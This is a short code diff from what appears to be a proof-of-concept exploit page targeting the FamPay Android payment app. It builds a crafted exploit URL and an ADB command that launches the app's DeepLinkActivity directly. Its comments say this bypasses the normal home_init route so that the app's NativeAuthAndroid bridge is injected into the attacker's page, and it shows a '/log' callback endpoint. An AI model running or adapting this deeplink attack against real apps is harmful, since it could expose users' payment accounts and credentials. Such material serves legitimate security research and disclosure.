@@ -180,13 +180,14 @@
   const exploitUrl = origin + '/exploit'
     + '?fp_type=fpSurvey'
     + '&fp_auth_req=true'
-    + '&fp_new_window=true'
     + '&source=app'
     + '&platform=android';
 
   const b64      = btoa(exploitUrl);
   const deeplink = 'fp://fampay.in/home_init/?init_deeplink=' + b64;
-  const adbCmd   = `adb shell am start -a android.intent.action.VIEW -d "${deeplink}" com.fampay.in`;
+  // Direct ADB: bypasses home_init, sends exploit URL straight to DeepLinkActivity
+  // This guarantees v1() is called with the https URL so NativeAuthAndroid is injected
+  const adbCmd   = `adb shell am start -n com.fampay.in/com.fampay.in.deeplink.DeepLinkActivity -a android.intent.action.VIEW -d "${exploitUrl}"`;
 
   document.getElementById('exploitUrlDisplay').innerText = origin + '/exploit';
   document.getElementById('callbackDisplay').innerText   = origin + '/log';
